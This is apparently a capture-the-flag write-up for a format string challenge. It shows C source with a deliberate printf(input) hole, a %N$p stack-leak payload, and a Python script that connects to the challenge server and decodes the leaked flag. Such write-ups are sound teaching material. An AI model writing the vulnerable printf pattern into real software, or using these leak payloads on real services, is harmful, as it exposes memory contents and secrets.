# Echo-Chamber - Solution Writeup

## The Challenge
**Description:**
> Welcome to the echo chamber. Say something, it says it back, sixteen times

**Flag:** `NNS{i_10ve_h0W_pR1NtF_74K35_7He_57aCk_a5_4RgUm3N7s}`

## Analysis

Looking at the provided source code in `chall.c`, the vulnerability is immediately apparent:

```c
#include <stdio.h>

int main(void) {
    char flag[128], input[128];

    setbuf(stdout, NULL);
    // 1. Flag is read directly onto the stack
    fgets(flag, sizeof(flag), fopen("/flag.txt", "r"));

    for (int i = 0; i < 16; i++) {
        printf("> ");
        if (!fgets(input, sizeof(input), stdin))
            break;
        // 2. Format string vulnerability!
        printf(input);
    }
}
```

The program uses `printf(input)` instead of `printf("%s", input)`. This is a classic **Format String Vulnerability**. Because the first argument to `printf` is a string we control, we can insert format specifiers (like `%x`, `%p`, `%s`) into our input. `printf` will interpret these and attempt to read subsequent arguments from the stack, even though no additional arguments were passed.

Crucially, the `flag` variable is a 128-byte array allocated directly on the stack right next to the `input` array. This means the contents of the flag are residing directly in the stack memory that `printf` will be reading from.

## Exploitation Strategy

Since this is a 64-bit architecture, arguments beyond the first six (which go in registers) are passed on the stack. `printf` will read 8 bytes (a 64-bit word) at a time for each `%p` specifier we give it. 

To leak the flag, we just need to provide a string of `%p` specifiers (or access specific offsets using `%[index]$p`) to read the stack's raw memory.

By experimenting, we can find that the `flag` array begins at the 22nd pointer on the stack. Therefore, a payload like:
`%22$p.%23$p.%24$p.%25$p.%26$p.%27$p.%28$p.%29$p`
will dump the hex representation of the flag directly from memory.

Because the architecture is Little Endian, the 8-byte hex blocks returned by the server need to be unpacked and reversed to recover the original ASCII string. 

For example, `0x30315f697b534e4e` converts to bytes `4e 4e 53 7b 69 5f 31 30`, which is the ASCII string `NNS{i_10`.

## The Solve Script

Here is a Python script that automates the exploitation. It connects over SSL, sends the payload to leak offsets 20 through 35, and decodes the resulting Little-Endian hex chunks back into ASCII text to reveal the flag.

```python
import socket
import ssl
import struct

def solve():
    host = 'echo-chamber-74c8a31a9e9c.chall.nnsc.tf'
    port = 1337

    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            print("Connected!")
            
            # Read prompt "> "
            ssock.recv(1024)
            
            # Leak pointers from the stack starting around offset 20
            payload = ".".join([f"%{i}$p" for i in range(20, 35)]) + "\n"
            ssock.sendall(payload.encode())
            
            response = ssock.recv(4096).decode(errors='replace')
            
            # Parse the leaked hex values and decode them
            flag = ""
            for p in response.split('.'):
                if p.startswith('0x'):
                    try:
                        val = int(p, 16)
                        if val != 0:
                            # Pack into 8 bytes little endian
                            decoded = struct.pack('<Q', val)
                            flag += decoded.decode(errors='ignore').replace('\x00', '')
                    except:
                        pass
            print("Extracted:", flag)

if __name__ == "__main__":
    solve()
```
